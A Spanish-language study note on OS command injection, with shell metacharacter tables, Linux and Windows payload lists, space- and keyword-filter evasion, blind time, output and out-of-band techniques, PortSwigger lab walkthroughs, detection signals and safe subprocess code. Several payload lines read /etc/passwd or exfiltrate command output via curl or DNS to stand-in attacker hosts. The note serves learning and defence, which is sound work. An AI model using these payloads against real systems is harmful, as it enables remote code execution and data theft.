---
aliases: ["OS Command Injection", "Inyección de Comandos", "Command Injection"]
tags:
  - sec/web
  - sec/web/rce
tipo: concepto
estado: terminado
creado: 2026-10-11
actualizado: 2026-10-11
relacionado:
  - "[[Local File Inclusion]]"
  - "[[Path Traversal]]"
  - "[[Log Poisoning]]"
  - "[[Server-Side Template Injection (SSTI)]]"
  - "[[Prototype Pollution]]"
fuente: "https://portswigger.net/web-security/os-command-injection"
---

# OS Command Injection

La **inyección de comandos del sistema operativo** ocurre cuando una aplicación **pasa datos controlados por el usuario a un intérprete de shell** (bash, cmd.exe, PowerShell) como parte de un comando. El shell, a diferencia de una función API, **parsea metacaracteres** (`;`, `|`, `&&`, `$()`, backticks): si el usuario controla parte de la línea, controla **comandos enteros**. El impacto es casi siempre **RCE completa** con los privilegios del proceso web — el escalonamiento más directo de una web a la infraestructura.

> [!info] Mecánica: por qué el shell es el problema
> Cuando el código hace `os.system("ping -c 1 " + host)` y `host = "8.8.8.8; id"`, el intérprete no ve un argumento — ve **dos comandos separados por `;`**. El riesgo no está en "ping", sino en que el shell primero **tokeniza** la línea por metacaracteres y luego ejecuta. Comparar:
>
> | Llamada | ¿Interpreta metacaracteres? | Riesgo |
> |---|---|---|
> | `execvp("ping", ["ping", user])` (Node `execFile`, Python `subprocess` lista) | No — argv plano | Bajo (salvo argument injection) |
> | `system("ping " + user)`, `exec("ping " + user)` | **Sí — pasa por `/bin/sh`** | **RCE** |
>
> La regla: *cualquier API cuyo primer argumento sea un string "shell completo"* (`system`, `exec` en PHP/Python, `popen`, `shell_exec`, backticks, `Runtime.getRuntime().exec(String)`) es vulnerable si el string contiene input.

## Metacaracteres y separadores

| Metacarácter | Semántica (bash/sh) | Semántica (cmd.exe) |
|---|---|---|
| `;` | ejecuta el siguiente comando siempre | no es separador en cmd |
| `\|` | pipe: salida del 1º → stdin del 2º | pipe también existe |
| `\|\|` | ejecuta el 2º si el 1º **falla** | igual |
| `&&` | ejecuta el 2º si el 1º **tiene éxito** | igual |
| `&` | ejecuta en background / separador | **separador de comandos en cmd** |
| `$()` / backticks | sustitución de comando (anida) | no en cmd |
| `\n` (0x0a) | nuevo comando en la siguiente línea | funciona en muchos parsers |
| `>` `>>` `<` | redirección de archivos | igual |
| `%VAR%` | — | expansión de variables (Windows) |
| `^` | escape en cmd.exe | escape de metacaracteres |

> [!tip] Los cuatro primeros son la prueba universal
> Ante un input que llega a un comando, prueba en orden: `;id`, `|id`, `||id`, `&&id` — y luego `\nid` y `%0aid`. Si alguno produce salida o error distinto, hay inyección. `$(sleep 5)` y `` `sleep 5` `` cubren contextos donde el input va **entre comillas** en el comando (el shell aún expande `$()` dentro de comillas dobles).

## Inyección por contexto de lenguaje

| Lenguaje / API | Vulnerable | Seguro (sin shell) |
|---|---|---|
| PHP | `system()`, `exec()`, `shell_exec()`, `passthru()`, `popen()`, `` ` `` , `proc_open()` | `proc_open` con array (PHP 7.4+), libssh2 |
| Python | `os.system()`, `os.popen()`, `subprocess.*(..., shell=True)` | `subprocess.run(["ping","-c","1",user])` (lista, `shell=False`) |
| Node.js | `child_process.exec()`, `execSync(string)` | `execFile()`, `spawn()` con `shell:false` |
| Java | `Runtime.getRuntime().exec(String)` (tokeniza por espacio, pero sigue pasando por ProcessBuilder), `ProcessBuilder(String)` | `new ProcessBuilder(List.of("ping","-c","1",user))` |
| Ruby | `system("ping #{user}")`, backticks, `%x()` | `system("ping", user)` (argumentos separados) |
| Go | `exec.Command("sh","-c", userString)` | `exec.Command("ping","-c","1",user)` |

**Trampas de escaping** (defensa frágil):

- `escapeshellarg()` (PHP) / `shlex.quote()` (Python) envuelven en comillas simples — seguro **si el resultado se usa como argumento completo** y el input no viaja por un shell de Windows (escapeshellarg en Windows es historically débil).
- **Java `Runtime.exec(String)` no usa shell** (tokeniza por espacios) — la inyección directa no funciona, pero si el token del usuario es un binario completo (`user = "/bin/sh"`, resto = argumentos) o hay interpolación posterior, sí. Además, sin shell no hay metacaracteres, pero sí **argument injection** (`-oProxyCommand=...` en git/ssh, flags de binarios).
- **`Runtime.exec(String[])`** en Java evita el tokenizado, pero si una posición es `["sh","-c",user]` vuelve a ser shell injection.

## Payloads por plataforma

**Linux:**

```bash
; id
| id
|| id
&& id
`id`
$(id)
%0a id                      # salto de línea
; cat /etc/passwd | base64  # exfiltrar
$(curl http://attacker/$(id|base64))  # OOB
```

**Windows (cmd.exe / PowerShell):**

```cmd
& whoami
| whoami
&& whoami
& powershell -c "whoami"
& for /f %i in ('whoami') do @echo %i
%COMSPEC% /c whoami          # si | y & están filtrados
```

**Evasión de espacios** (cuando el input no puede contener espacios):

| Alternativa | Ejemplo |
|---|---|
| `$IFS` (bash) | `cat$IFS/etc/passwd` |
| `{IFS}` | `cat${IFS}/etc/passwd` |
| Tab `%09` / `%20` | `cat%09/etc/passwd` |
| Comillas | `cat"/etc/passwd"` , `ca''t /etc/passwd` |
| Wildcard | `?at /etc/pass*` |
| Llaves (brace expansion) | `{cat,/etc/passwd}` (bash) |

**Evasión de filtros de palabras**: `c'a't`, `c"at"`, `\c\at`, `a??` (wildcard), `$(echo Y3QgL2V0Yy9wYXNzd2Q=|base64 -d|sh)` para ocultar `cat /etc/passwd`.

## Metodología de explotación

1. **Localizar el punto**: formularios (feedback, stock, search), parámetros de "dominio/IP/archivo", headers (`X-Forwarded-For` a veces logueado o ejecutado en ping de monitoreo), cookies.
2. **Confirmar**: payloads separadores + observar oráculo (salida reflejada = in-band; error de bash; retardo = blind).
3. **Clasificar**: *in-band* (vemos la salida), *blind por tiempo*, *blind por salida* (redirección a un path web-accessible), *blind OOB* (Collaborator/DNS).
4. **Explotar**: escalar a reverse shell, persistir, mover lateral.

### Blind por tiempo

```bash
; sleep 10          # Linux
; ping -n 10 127.0.0.1   # Windows (~10 s)
$(sleep 10)         # dentro de comillas dobles
; timeout 10 ping attacker  # alternativas
```

Criterio: el retardo debe ser **consistente y proporcional** (5 s → ~5 s, 10 s → ~10 s) para descartar latencia normal.

### Blind por salida (escritura en directorio web)

```bash
; id > /var/www/html/images/test.txt
; whoami >> /var/www/html/images/out.txt   # append si no se sobrescribe
```

Luego se lee `https://target/images/test.txt` por HTTP. Útil cuando el input va en un formulario sin respuesta visible.

### Out-of-band (OOB)

```bash
; nslookup $(whoami).COLLAB.burpcollaborator.net
; curl http://COLLAB/$(whoami|base64)
; ping -n 1 COLLAB   (Windows: el resolver hace la consulta A)
```

El DNS de Collaborator registra el subdominio → exfiltra datos sin canal de respuesta. Ideal cuando firewalls salientes permiten DNS pero no HTTP directo.

## Labs PortSwigger: walkthroughs

### Lab: OS Command Injection, caso simple

En este laboratorio, debemos explotar una vulnerabilidad de ejecución de comandos. Según la descripción de la web, esta se encuentra en el apartado 'stock checker'. Para completarlo, debemos ejecutar el comando `whoami`.

Comenzaremos examinando el apartado 'stock checker':
![[Pasted image 20250922092642.png]]

Capturaremos la petición que se envía al hacer clic:

![[Pasted image 20250922092749.png]]

Observamos cómo se está realizando la petición. La hipótesis inicial es que uno de los dos parámetros es vulnerable a la ejecución de comandos. Dado que desconocemos la lógica interna y cómo se procesan los valores, debemos probar diferentes técnicas de inyección, como:

```bash
;whoami
|whoami
||whoami
&&whoami
```

> [!info] Operadores de Inyección de Comandos
> Los operadores de shell son cruciales para encadenar comandos.
> *   `;`: Ejecuta el siguiente comando independientemente del éxito del anterior.
> *   `|`: Redirige la salida del primer comando como entrada del segundo (pipe).
> *   `||`: Ejecuta el segundo comando SOLO si el primero falla.
> *   `&&`: Ejecuta el segundo comando SOLO si el primero tiene éxito.
> *   `$(comando)` o `` `comando` ``: Ejecuta el comando y sustituye su salida en la línea de comandos principal.

![[Pasted image 20250922093054.png]]

Observamos un error al intentar ejecutar el comando, pero la respuesta menciona 'bash', lo que indica que estamos en el camino correcto. Parece que estamos corrompiendo la petición al pasar el comando como un parámetro adicional. Por lo tanto, intentaremos añadir el comando al final de la petición para ver si es procesado correctamente:

![[Pasted image 20250922093347.png]]

¡Perfecto! Esta vez funcionó y nos devolvió la salida del comando:

![[Pasted image 20250922093448.png]]

Laboratorio terminado.

### Lab: OS Command Injection ciega con retardos de tiempo

En este caso, la inyección de comandos es ciega (blind). El objetivo es causar que el servidor se demore en responder aproximadamente 10 segundos.

Dado que no sabemos dónde ocurre la posible inyección, comenzaremos capturando una sección donde haya entrada de datos, como el formulario "Submit Feedback" en la web:

![[Pasted image 20250922094541.png]]

Podemos observar múltiples campos que podrían ser inyectables. Para encontrar la vulnerabilidad, debemos probar uno por uno:

![[Pasted image 20250922094741.png]]

En campos como 'name', 'subject' y 'message', obtenemos la misma respuesta al enviar un `;` incluido en su contenido. Esto sugiere que estamos causando algún tipo de error. Podemos intentar enviar comandos, pero no veremos una respuesta directa, ya que, en esta ocasión, la inyección es ciega.

Podemos intentar ejecutar comandos que introduzcan un retardo de tiempo, lo que nos permitirá identificar si se están ejecutando:

![[Pasted image 20250922095007.png]]

Esto no funciona. Es posible que el comando se esté pasando como un parámetro. Sin embargo, si lo ejecutamos usando `$(sleep 5)`, lo que hace es ejecutar el comando e insertar su salida (en este caso, nada) en la línea de comandos principal, lo que a menudo permite la ejecución:

![[Pasted image 20250922095129.png]]

De esta forma, sí se permite la ejecución de comandos. Otra alternativa, en caso de que no se permitan caracteres como `()` o `$`, sería encapsular la petición con `;` de la siguiente manera:

![[Pasted image 20250922095312.png]]

> [!tip] Técnicas de Inyección Ciega Basada en Tiempo
> Para inyecciones de comandos ciegas, los retardos de tiempo son una técnica fundamental.
> *   **Linux**: `sleep N` (donde N es el número de segundos).
> *   **Windows**: `ping -n N 127.0.0.1` (donde N es el número de pings, aproximadamente N segundos).
> La clave es observar el tiempo de respuesta del servidor. Un retardo significativo y consistente después de inyectar un comando `sleep` o `ping` confirma la ejecución.

En este caso, en el parámetro 'name' no funcionó de esa manera, pero en 'email' sí. Por lo tanto, es muy importante tener esto en cuenta al realizar pruebas.

Ahora, completemos el laboratorio enviando un `sleep` de 10 segundos:

![[Pasted image 20250922095442.png]]

Laboratorio terminado.

### Lab: OS Command Injection ciega con redirección de salida

En este laboratorio, se nos informa que existe una ruta `www/images` que permite almacenar imágenes. Dado que la inyección es ciega, podemos usar esta ruta para almacenar la salida de un comando en un archivo.

La inyección se encuentra en el mismo formulario de feedback que en el laboratorio anterior, por lo que comenzaremos directamente:

![[Pasted image 20250922102522.png]]

En este caso, el objetivo sería identificar el punto de inyección de comandos, pero como ya lo conocemos, lo primero será ejecutar un `sleep` para confirmar que es válido:

![[Pasted image 20250922102705.png]]

Sí, es válido. En este punto, ejecutaremos un comando y redirigiremos su salida a la ruta especificada, con el nombre `test.txt`, para que se almacene:

![[Pasted image 20250922102831.png]]

> [!info] Redirección de Salida en OS Command Injection
> La redirección de salida (`>`, `>>`, `2>`, `&>`) es una técnica vital en inyecciones ciegas para exfiltrar información.
> *   `comando > archivo`: Redirige la salida estándar (stdout) de `comando` a `archivo`, sobrescribiendo si existe.
> *   `comando >> archivo`: Redirige la salida estándar (stdout) de `comando` a `archivo`, añadiendo al final si existe.
> *   `comando 2> archivo`: Redirige la salida de error estándar (stderr) de `comando` a `archivo`.
> *   `comando &> archivo`: Redirige tanto stdout como stderr a `archivo`.
> En este laboratorio, al redirigir la salida a un directorio accesible por el servidor web (`www/images`), podemos luego navegar a `www.ejemplo.com/images/test.txt` para ver el contenido.

Vemos que, al parecer, funcionó. En este punto, podemos verificar la ruta donde, mediante una imagen, descubrimos cómo se están cargando los archivos. Observamos lo siguiente:

![[Pasted image 20250922102917.png]]

Y con esto, el laboratorio debería resolverse:
![[Pasted image 20250922102939.png]]

Laboratorio terminado.

### Lab: OS Command Injection ciega con interacción fuera de banda (Out-of-Band)

En este laboratorio, veremos cómo podemos observar los comandos ejecutados a nivel de sistema cuando no tenemos ninguna forma de verlos o almacenarlos, como en el laboratorio anterior.

Ya conocemos el punto de inyección, por lo que procedemos a capturar la petición para poder analizarla:

![[Pasted image 20250922103346.png]]

¡Perfecto! Ya sabemos cuál es el parámetro en el que vamos a inyectar, por lo que solo lo comprobaremos por rutina:

![[Pasted image 20250922103703.png]]

Al parecer, funciona. En este punto, lo único que nos pide el laboratorio es que realicemos una solicitud al Burp Collaborator con `nslookup` de la siguiente manera:

![[Pasted image 20250922104107.png]]

> [!warning] Interacción Fuera de Banda (Out-of-Band - OOB)
> Las técnicas OOB son esenciales para detectar y explotar vulnerabilidades ciegas donde no hay una respuesta directa o un canal de exfiltración de datos claro.
> *   **DNS Lookup**: Utiliza comandos como `nslookup` o `dig` para forzar una consulta DNS a un dominio controlado (como Burp Collaborator). Si la consulta llega, confirma la ejecución del comando.
> *   **HTTP Request**: Utiliza herramientas como `curl` o `wget` para forzar una petición HTTP a un servidor controlado.
> *   **SMTP/SMB**: Menos comunes, pero también pueden usarse para exfiltración o confirmación.
> Burp Collaborator es una herramienta ideal para esto, ya que proporciona un servidor DNS, HTTP y SMTP único para cada prueba, registrando todas las interacciones.

Si revisamos el Collaborator, veremos lo siguiente:

![[Pasted image 20250922104138.png]]

¡Perfecto! Sí nos llegaron las solicitudes, y esto es todo:
![[Pasted image 20250922104153.png]]

Laboratorio terminado.

### Lab: OS Command Injection ciega con exfiltración de datos fuera de banda (Out-of-Band)

Este laboratorio es prácticamente lo mismo que el anterior, con la diferencia de que en este punto debemos enviar información a través de la petición. En este caso, se nos pide la salida del comando `whoami`.

De igual forma, tenemos el punto de inyección de comandos y vamos a ir directamente a ejecutarlo, ya que sabemos dónde se están inyectando los comandos. En este punto, veremos que para la solicitud hacemos:

![[Pasted image 20250922105008.png]]

> [!tip] Exfiltración de Datos OOB con DNS
> Para exfiltrar datos a través de DNS en una inyección ciega, se puede concatenar la salida de un comando con un subdominio único y luego realizar una consulta DNS a ese subdominio en un dominio controlado.
> Ejemplo: `$(whoami).tu_dominio_collaborator.burpcollaborator.net`
> El servidor DNS del Collaborator registrará una consulta para `[nombre_de_usuario].tu_dominio_collaborator.burpcollaborator.net`, revelando el nombre de usuario. Es importante codificar caracteres especiales si la salida del comando puede contenerlos.

En este caso, hicimos uso del otro tipo de inyección mediante el cual obtenemos el nombre de usuario del sistema:

![[Pasted image 20250922105041.png]]

¡Perfecto! Podemos ver si se completó el laboratorio:
![[Pasted image 20250922105132.png]]

Laboratorio terminado.

## Detección (lado defensor)

- **Logs**: líneas de comando con metacaracteres (`; id`, `$()`, `../` seguido de binarios), User-Agent o parámetros con patrones de shell.
- **WAF/IDS**: reglas para `;`, `|`, `$(`, backticks en parámetros de query y formularios (evadibles: es solo capa).
- **Monitoreo de procesos**: hijos sospechosos del proceso web (`bash`, `curl`, `nc`, `python -c`) — EDR/sysmon `EventID 1`.
- **Errores**: mensajes de shell (`bash: -c: line 1: syntax error`, `sh: 1: not found`) reflejados en respuestas.

## Defensas

**1. No uses shell.** La defensa real es pasar argumentos como lista/array a la API de proceso:

```python
# VULNERABLE
os.system("ping -c 1 " + host)
subprocess.run(f"ping -c 1 {host}", shell=True)

# SEGURO — argv plano, sin intérprete
subprocess.run(["ping", "-c", "1", host], check=True,
               capture_output=True, timeout=5)
```

```js
// Node.js
const { execFile } = require('child_process');
execFile('/usr/bin/ping', ['-c', '1', host], { timeout: 5000 }, cb); // no pasa por sh
// VULNERABLE: exec(`ping -c 1 ${host}`)
```

**2. Si *debes* usar shell**, escapa **cada** argumento (y solo si no hay alternativa):

```php
// PHP — escapar SIEMPRE cada argumento y validar tipo
$host = escapeshellarg($_GET['host']);      // envuelve en comillas simples
$output = shell_exec("ping -c 1 $host");
// además: allowlist ^[a-zA-Z0-9.\-]+$ antes de llegar al shell
```

```python
import shlex
cmd = "ping -c 1 " + shlex.quote(host)     # solo si shell es inevitable
```

> [!warning] `escapeshellarg` no salva un diseño roto
> Escapar mitiga la inyección de *argumentos*, pero no valida el *semántico*: sigue permitiendo que el usuario decida a qué host/binario se llama. Combina allowlist de formato (`preg_match('/^[a-z0-9.\-]+$/', $host)`) + escape +, si es posible, eliminar el shell por completo. Y ojo: escapeshellarg asume shell POSIX; en Windows su comportamiento histórico es más débil.

**3. Validación por allowlist**: dominios/IPs/IDs conocidos; nunca "lo que sea que el usuario mande".
**4. Minimizar privilegios**: usuario sin shell, sin compiler, `no-new-privileges`, red restringida — el impacto de una inyección exitosa cae en picos.
**5. `disable_functions` en PHP** como defensa en profundidad (mitiga impacto, no la causa — hay bypasses con `pcntl_exec`, FFI, etc.).

## Errores comunes

**Atacante:**
1. Probar solo `;` — cmd.exe no lo usa; en Windows prueba `&`, `\|`, `%0a`.
2. Inyectar en un parámetro que va a `execFile`/subprocess-lista: no hay shell, no hay metacaracteres (prueba argument injection: `-oProxyCommand=id`).
3. Asumir retardo = inyección: mide con baseline y con `sleep 1` vs `sleep 10` para descartar ruido.
4. Olvidar codificar: `$()` y espacios pueden requerir URL-encoding en el body/query.

**Defensor:**
1. `shell=True` con f-strings/"para comodidad" — la causa #1 en Python.
2. Escapar un argumento pero interpolar otros 3 en el mismo comando.
3. Filtrar una lista de binarios (`rm`, `curl`) en vez de eliminar el shell: evasión trivial con `c'a't`, `/bin/ba''sh`, wildcards.
4. Confiar en validación del lado cliente (el shell nunca ve el JS).

## Cheatsheet

| Concepto | Valor |
|---|---|
| Prueba universal | `;id`, `\|id`, `\|\|id`, `&&id`, `\nid`, `$(sleep 5)` |
| Windows | `& whoami`, `\| whoami`, `powershell -c whoami` |
| Blind tiempo | `sleep N` (Linux), `ping -n N 127.0.0.1` (Win) |
| Blind salida | `; id > /var/www/html/<dir>/out.txt` |
| OOB | `; nslookup $(id).COLLAB.net`, `; curl http://COLLAB/$(id\|base64)` |
| Sin espacios | `$IFS`, `%09`, `{cat,/etc/passwd}`, `ca''t` |
| Exfil simple | salida `\| base64` y pegarla en subdominio DNS |
| Defensa #1 | subprocess/execFile con argv en lista, nunca shell |
| Defensa #2 | allowlist estricta + `shlex.quote`/`escapeshellarg` si el shell es inevitable |

## Referencias

- PortSwigger Web Security Academy — OS command injection: https://portswigger.net/web-security/os-command-injection
- OWASP Command Injection: https://owasp.org/www-community/attacks/Command_Injection
- HackTricks — Command Injection: https://book.hacktricks.wiki/en/pentesting-web/command-injection.html
- PayloadsAllTheThings — Command Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection

## Relacionadas

- [[Local File Inclusion]] — otra vía a RCE sin shell (intérpretes de archivos)
- [[Path Traversal]] — si la ruta viaja a un shell, la misma entrada inyecta comandos
- [[Log Poisoning]] — el comando inyectado puede escribir en logs para persistencia
- [[Server-Side Template Injection (SSTI)]] — RCE vía plantillas cuando no hay shell de por medio
- [[Prototype Pollution]] — RCE server-side sin inyección de sintaxis (gadgets)
